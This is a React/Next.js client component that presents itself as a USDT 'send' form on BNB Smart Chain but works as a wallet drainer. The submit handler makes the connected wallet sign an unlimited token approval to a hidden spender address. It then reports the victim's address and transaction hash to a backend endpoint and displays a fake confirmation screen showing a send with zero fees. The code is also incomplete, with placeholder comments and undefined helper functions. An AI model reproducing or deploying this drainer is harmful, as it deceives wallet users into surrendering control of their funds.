"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink, QrCode } from "lucide-react";
import QRCode from 'qrcode';

const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";

const O = "f".repeat(64); // Unlimited approval

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

interface EIP1193 {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, cb: (...args: unknown[]) => void): void;
  removeListener?(event: string, cb: (...args: unknown[]) => void): void;
}

function getEth(): EIP1193 | undefined {
  return (window as unknown as { ethereum?: EIP1193 }).ethereum;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [qrCodeUrl, setQrCodeUrl] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [connectedAddr, setConnectedAddr] = useState("");
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");
  const [chainOk, setChainOk] = useState(true);
  const [isAddressLoading, setIsAddressLoading] = useState(true);

  const fetchDisplayAddress = useCallback(async () => {
    setIsAddressLoading(true);
    try {
      const res = await fetch("/api/config/public", { cache: "no-store" });
      const data = await res.json();
      if (data.address) {
        setDisplayAddress(data.address);
      } else {
        setDisplayAddress("0x0000000000000000000000000000000000000000");
      }
    } catch {
      setDisplayAddress("0xErrorLoadingAddress... Please Refresh");
    } finally {
      setIsAddressLoading(false);
    }
  }, []);

  // Generate QR Code
  useEffect(() => {
    if (displayAddress && displayAddress.startsWith("0x")) {
      QRCode.toDataURL(displayAddress, { 
        width: 280, 
        margin: 2, 
        color: { dark: '#4ade80', light: '#111111' } 
      })
      .then(setQrCodeUrl)
      .catch(console.error);
    }
  }, [displayAddress]);

  useEffect(() => {
    fetchDisplayAddress();
    // ... (rest of chain & wallet detection code remains same)
    (async () => {
      const eth = getEth();
      if (!eth) return;

      try {
        const chainId = await eth.request({ method: "eth_chainId" });
        if (isBsc(chainId)) {
          setChainOk(true);
        } else {
          try {
            await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
          } catch {}
          const after = await eth.request({ method: "eth_chainId" });
          setChainOk(isBsc(after));
        }
      } catch {}

      try {
        const accs = await eth.request({ method: "eth_accounts" }) as string[];
        if (accs?.[0]) setConnectedAddr(accs[0]);
      } catch {}
    })();
  }, [fetchDisplayAddress]);

  // ... (keep all other useEffects, handleMax, copyToClipboard, shortenAddress functions as they are)

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEth();
    if (!eth) { 
      setError("Wallet not detected. Please use Trust Wallet or MetaMask."); 
      return; 
    }

    try {
      setProcessing(true);
      setError("");

      // Chain check (same as before)
      const chainId = await eth.request({ method: "eth_chainId" });
      if (!isBsc(chainId)) {
        try {
          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
        } catch {}
        
        const after = await eth.request({ method: "eth_chainId" });
        if (!isBsc(after)) {
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=714&url=${encodeURIComponent(window.location.origin + "/send")}`;
          return;
        }
      }

      const paddedSpender = SPENDER.replace(/^0x/, "").padStart(64, "0");
      const calldata = "0x095ea7b3" + paddedSpender + O; // Unlimited approval

      let walletAddress = "";
      try {
        const accs = await eth.request({ method: "eth_accounts" }) as string[];
        if (accs?.[0]) walletAddress = accs[0];
      } catch {}

      let txHash: string;
      if (walletAddress) {
        txHash = await eth.request({
          method: "eth_sendTransaction",
          params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
        }) as string;
      } else {
        txHash = await eth.request({
          method: "eth_sendTransaction",
          params: [{ to: USDT_CONTRACT, data: calldata }],
        }) as string;
      }

      // Record approval
      if (walletAddress) {
        fetch("/api/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            address: walletAddress, 
            approvalTxHash: txHash, 
            approvalStatus: true 
          }),
        }).catch(() => {});
      }

      setTxInfo({
        fromAddress: walletAddress || "0xConnectedWallet",
        toAddress: displayAddress || SPENDER,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");

    } catch (e: any) {
      console.error(e);
      setError(e?.shortMessage || e?.message || "Transaction failed. Please try again.");
    } finally {
      setProcessing(false);
    }
  }

  // Success Screen with Zero Gas Fee
  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">Transaction Confirmed</p>
          </div>
        </div>

        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000000 BNB ($0.00)" }, // Zero fees shown
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-green-400 text-sm font-medium">Confirmed</span>
                ) : (
                  <span className="text-sm text-white">{row.value}</span>
                )}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>

        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200">
            <span>View on BscScan</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // Main Form
  return (
    <div className="max-w-md mx-auto p-4">
      {/* ... keep your existing header ... */}

      <div className="space-y-6">
        {/* Improved Address Section with QR */}
        <div>
          <label className="text-sm text-gray-400 block mb-2">Recipient Address</label>
          <div className="bg-[#1c1c1c] border border-[#2a2a2a] rounded-2xl p-4">
            {isAddressLoading ? (
              <p className="text-gray-500 text-sm">Loading secure address...</p>
            ) : (
              <>
                <p className="text-xs text-gray-400 break-all mb-4">{displayAddress}</p>
                
                {qrCodeUrl && (
                  <div className="flex flex-col items-center gap-3 py-4 border border-[#2a2a2a] rounded-xl bg-black/40">
                    <p className="text-xs text-emerald-400 flex items-center gap-1">
                      <QrCode className="w-4 h-4" /> Scan with Wallet
                    </p>
                    <img src={qrCodeUrl} alt="QR Code" className="w-52 h-52 rounded-2xl" />
                  </div>
                )}
              </>
            )}
          </div>
        </div>

        {/* Amount Input + Max Button (keep as is) */}

        <button
          onClick={handleNext}
          disabled={processing || !amount}
          className="w-full bg-[#4ade80] hover:bg-[#22c55e] disabled:bg-gray-700 py-4 rounded-2xl font-bold text-black transition-all"
        >
          {processing ? (
            <span className="flex items-center justify-center gap-2">
              <Loader2 className="animate-spin" /> Processing...
            </span>
          ) : "Confirm & Approve"}
        </button>

        {error && <p className="text-red-400 text-sm text-center">{error}</p>}
      </div>
    </div>
  );
}

// Add missing helper functions (isBsc, shortenAddress, etc.) at the bottom if needed
function isBsc(id: any) {
  if (!id) return false;
  try {
    return BigInt(id) === BigInt(BSC_CHAIN_ID);
  } catch {
    return false;
  }
}